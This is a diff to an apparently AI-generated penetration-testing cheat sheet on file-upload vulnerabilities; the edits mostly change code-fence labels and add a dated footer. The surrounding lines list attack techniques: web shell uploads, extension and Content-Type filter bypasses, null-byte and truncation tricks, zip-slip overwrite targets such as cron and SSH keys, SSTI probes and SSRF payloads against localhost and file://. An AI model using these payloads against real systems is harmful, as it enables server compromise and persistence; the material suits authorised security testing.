@@ -126,7 +126,7 @@ print(subprocess.check_output(cmd,shell=True).decode())
 
 ## Attack Flow
 
-```
+```bash
 1. Identify upload endpoint and backend language
 2. Try a benign file upload — confirm it works and find the upload path
 3. Try a minimal web shell upload directly
@@ -144,7 +144,7 @@ JS validation runs in the browser — trivially bypassed.
 
 ### Method 1: Remove validation in DevTools
 
-```
+```text
 F12 → Inspector → find <input type="file" accept=".jpg,.png" onchange="validate()">
 → Remove `accept` attribute
 → Remove or clear `onchange` handler (delete validate() call)
@@ -153,7 +153,7 @@ F12 → Inspector → find <input type="file" accept=".jpg,.png" onchange="valid
 
 ### Method 2: Intercept in Burp
 
-```
+```bash
 1. Upload a legitimate file (e.g., image.jpg)
 2. Intercept the upload request in Burp Proxy
 3. In the request body, change:
@@ -171,7 +171,7 @@ Server blocks specific extensions (`.php`, `.asp`, etc.) — try alternatives.
 
 ### PHP alternatives
 
-```
+```bash
 .php .php2 .php3 .php4 .php5 .php6 .php7 .php8
 .pht .phar .phtm .phtml .phps .pgif .shtml
 .inc .pif .wbmp
@@ -179,7 +179,7 @@ Server blocks specific extensions (`.php`, `.asp`, etc.) — try alternatives.
 
 ### ASP alternatives
 
-```
+```bash
 .asp .aspx .config .cer .asa .asax .ascx .ashx .axd .asmx
 ```
 
@@ -187,7 +187,7 @@ Server blocks specific extensions (`.php`, `.asp`, etc.) — try alternatives.
 
 Filters doing string comparison without `.toLowerCase()` miss mixed-case variants:
 
-```
+```bash
 shell.PHP   shell.Php   shell.pHp   shell.PhP
 shell.ASP   shell.Asp   shell.ASPX  shell.Aspx
 ```
@@ -215,7 +215,7 @@ ffuf -u http://target.com/upload.php -X POST -F "file=@shell.FUZZ;type=image/jpe
 
 ### Fuzz with Burp Intruder
 
-```
+```text
 1. Capture upload request in Burp → Send to Intruder
 2. Mark the extension in the filename as payload position:
    Content-Disposition: form-data; name="file"; filename="shell.§php§"
@@ -231,7 +231,7 @@ Server only allows specific extensions — trick it into accepting executable fi
 
 ### Double Extension
 
-```
+```text
 shell.jpg.php     → if server stops at first extension (jpg)
 shell.php.jpg     → if server executes on first extension, ignores last
 shell.php%00.jpg  → null byte — truncates at %00 (older PHP/servers)
@@ -241,7 +241,7 @@ shell.php%00.jpg  → null byte — truncates at %00 (older PHP/servers)
 
 Some backends truncate filenames at a fixed length (e.g., 255 bytes). If the filter validates the full string but the OS stores only the first N chars, pad with junk to push the allowed extension out of range:
 
-```
+```bash
 # If max filename ~255 bytes, the .jpg gets truncated, leaving .php
 shell.php[AAA...255 chars total].jpg
 ```
@@ -257,7 +257,7 @@ python3 -c "print('shell.php' + 'A'*241 + '.jpg')"
 
 Inject special chars between extensions to confuse filter:
 
-```
+```bash
 %20  %0a  %00  %0d0a  /  .\  .  …  :
 ```
 
@@ -326,7 +326,7 @@ Server checks the `Content-Type` header in the request.
 ### Manual
 
 In Burp — change the header in the upload request:
-```
+```bash
 Content-Type: application/x-php
 → change to →
 Content-Type: image/jpeg
@@ -529,7 +529,7 @@ def handleResponse(req, interesting):
 ```
 
 Workflow:
-```
+```text
 1. Intercept upload request → Send to Turbo Intruder
 2. Simultaneously: queue upload + GET to the upload path
 3. Engine.openGate() fires all requests at once
@@ -561,7 +561,7 @@ zip evil.zip shell.php
 ```
 
 Targets to overwrite:
-```
+```text
 /var/www/html/shell.php       → web root (RCE)
 /etc/cron.d/backdoor          → cron job
 ~/.ssh/authorized_keys        → SSH persistence
@@ -671,7 +671,7 @@ If the application accepts template files and renders them server-side (Jinja2, 
 
 ### Workflow
 
-```
+```bash
 1. Upload a template file (e.g., .html, .twig, .j2, .ftl)
 2. If rendered — embed probe payload {{7*7}} or ${7*7}
 3. Identify engine from output or error messages
@@ -685,7 +685,7 @@ If the application accepts template files and renders them server-side (Jinja2, 
 
 Some upload forms accept a remote URL to fetch the file. The server-side fetch is an SSRF vector.
 
-```
+```bash
 # Common form field names
 url=  source=  remote=  fetch=  image_url=  download=
 ```
@@ -711,7 +711,7 @@ url=file:///var/www/html/config.php
 
 ### Filter bypass for SSRF
 
-```
+```bash
 # IP encoding alternatives for 127.0.0.1
 url=http://0x7f000001/
 url=http://2130706433/
@@ -735,7 +735,7 @@ url=http://<collaborator-url>/test
 
 ## Checklist
 
-```
+```bash
 [ ] Upload benign file — confirm upload works and find the upload path
 [ ] Upload minimal PHP shell directly — check if it executes
 [ ] Client-side bypass: remove JS validation, intercept with Burp
@@ -758,3 +758,9 @@ url=http://<collaborator-url>/test
 [ ] Template files accepted? → test SSTI ({{7*7}}, ${7*7})
 [ ] Upload-from-URL field? → test SSRF (127.0.0.1, metadata, file://)
 ```
+
+---
+
+*Created: 2026-03-02*
+*Updated: 2026-05-13*
+*Model: claude-sonnet-4-6*
